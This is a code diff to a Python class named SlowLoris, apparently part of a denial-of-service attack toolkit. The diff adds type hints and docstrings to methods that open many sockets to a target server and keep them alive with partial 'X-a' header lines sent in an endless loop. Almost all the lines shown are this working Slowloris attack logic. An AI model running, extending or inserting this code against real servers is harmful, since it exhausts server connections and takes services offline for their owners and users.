@@ -20,7 +20,7 @@ class SlowLoris(SocketAttacker):
         soc.settimeout(5)
         return soc
 
-    def run(self):
+    def run(self) -> None:
         self.fill_sockets_list()
         while True:
             for soc in self._sockets_list:
@@ -32,7 +32,10 @@ class SlowLoris(SocketAttacker):
             self.fill_sockets_list()
             sleep(self._keep_connection_timeout)
 
-    def fill_sockets_list(self):
+    def fill_sockets_list(self) -> None:
+        """
+        Tryes to fill connections to maximum
+        """
         for i in range(self._sockets_to_keep - len(self._sockets_list)):
             try:
                 soc = self.init_socket_connection()
@@ -40,7 +43,10 @@ class SlowLoris(SocketAttacker):
             except socket.error:
                 break
 
-    def init_socket_connection(self):
+    def init_socket_connection(self) -> socket.socket:
+        """
+        Initiate connection and send initial data
+        """
         address = self.address.get_address()
         port = int(self.address.get_port())
         soc = self.get_socket()
@@ -51,7 +57,10 @@ class SlowLoris(SocketAttacker):
         return soc
 
     @staticmethod
-    def send_keep_alive_data(soc):
+    def send_keep_alive_data(soc) -> None:
+        """
+        Sending keep alive connection to prevent server to close connection
+        """
         soc.send(f"X-a {random.randint(1, 5000)}\r\n".encode('UTF-8'))
 
     def print_opened_sockets_number(self):
